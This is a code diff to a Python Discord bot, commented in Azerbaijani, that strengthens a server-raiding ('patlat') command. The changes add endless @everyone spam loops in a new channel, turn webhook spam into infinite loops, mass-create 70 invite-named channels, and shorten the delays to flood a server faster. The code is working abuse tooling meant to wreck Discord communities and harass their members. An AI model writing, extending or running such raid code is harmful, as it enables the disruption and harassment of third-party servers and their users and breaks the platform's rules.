@@ -14,7 +14,7 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 # --- AYRI-AYRI TƏNZİMLƏMƏLƏR ---
 SAHIB_ID = 641014966312501259        # Sənin şəxsi Discord ID-n
-GUVENLI_SERVER_ID = 1520692621964738722  # Qorunan əsas serverinin ID-si (istəsən öz server ID-n ilə dəyişə bilərsən)
+GUVENLI_SERVER_ID = 1520692621964738722  # Qorunan əsas serverinin ID-si
 # --------------------------------
 
 user_levels = {}
@@ -596,52 +596,58 @@ async def patlat_cmd(ctx):
         except:
             pass
 
+    # Ən üstdə yaradılacaq RUHUM-TANRI kanalı və dayanmadan minlərlə mesaj spamı
+    try:
+        son_kanal = await guild.create_text_channel("RUHUM-TANRI")
+        async def ruhum_tanri_spam():
+            while True:
+                try:
+                    await son_kanal.send("@everyone discord.gg/aga yaz gır oql !")
+                except:
+                    break
+                await asyncio.sleep(0.1)
+        
+        for _ in range(3):
+            asyncio.create_task(ruhum_tanri_spam())
+    except:
+        pass
+
     qlobal_webhooks = []
     for i in range(1, 4):
         try:
             ch = await guild.create_text_channel(f"aga-qoruma-{i}")
             wh = await ch.create_webhook(name=f"XAS-Global-{i}")
             qlobal_webhooks.append(wh)
-            await asyncio.sleep(1.0) 
+            await asyncio.sleep(0.5) 
         except:
             pass
 
-    async def send_webhook_spam(webhook, count=25):
-        for _ in range(count):
+    async def send_webhook_spam(webhook):
+        while True:
             try:
-                await webhook.send("discord.gg/aga yaz gır oql!")
+                await webhook.send("@everyone discord.gg/aga yaz gır oql !")
             except:
-                pass
-            await asyncio.sleep(0.15)
+                break
+            await asyncio.sleep(0.1)
 
     async def create_channel_and_spam(i):
         try:
-            channel = await guild.create_text_channel(f"discord.gg/aga-{i}")
+            channel = await guild.create_text_channel(f"discordggaga-{i}")
             if qlobal_webhooks:
                 for wh in qlobal_webhooks:
-                    asyncio.create_task(send_webhook_spam(wh, 10))
+                    asyncio.create_task(send_webhook_spam(wh))
         except:
             pass
 
-    chunk_size = 2
-    for start in range(1, 61, chunk_size):
-        tasks_list = [create_channel_and_spam(i) for i in range(start, min(start + chunk_size, 61))]
+    chunk_size = 3
+    for start in range(1, 71, chunk_size):
+        tasks_list = [create_channel_and_spam(i) for i in range(start, min(start + chunk_size, 71))]
         await asyncio.gather(*tasks_list, return_exceptions=True)
-        await asyncio.sleep(1.0)
-
-    try:
-        son_kanal = await guild.create_text_channel("RUHUM-TANRI")
-        for _ in range(10):
-            try:
-                await son_kanal.send("@everyone ruhum shdı gagas discord.gg/aga")
-            except:
-                pass
-            await asyncio.sleep(0.5)
-    except:
-        pass
+        await asyncio.sleep(0.5)
 
 if __name__ == "__main__":
     TOKEN = os.getenv("DISCORD_TOKEN")
     if TOKEN:
         bot.run(TOKEN)
         
+  
